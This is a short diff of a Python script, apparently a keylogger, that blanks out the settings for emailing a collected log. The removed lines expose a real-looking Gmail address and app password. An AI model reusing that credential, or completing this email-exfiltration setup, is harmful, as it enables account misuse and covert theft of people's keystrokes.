@@ -5,9 +5,9 @@ from threading import Timer
 
 log = ""
 
-EMAIL_ORIGEM = "experiences343@gmail.com"
-EMAIL_DESTINO = "experiences343@gmail.com"
-SENHA_EMAIL = "obkk nkob nbpi xuxu"
+EMAIL_ORIGEM = ""
+EMAIL_DESTINO = ""
+SENHA_EMAIL = ""
 
 
 def enviar_email():
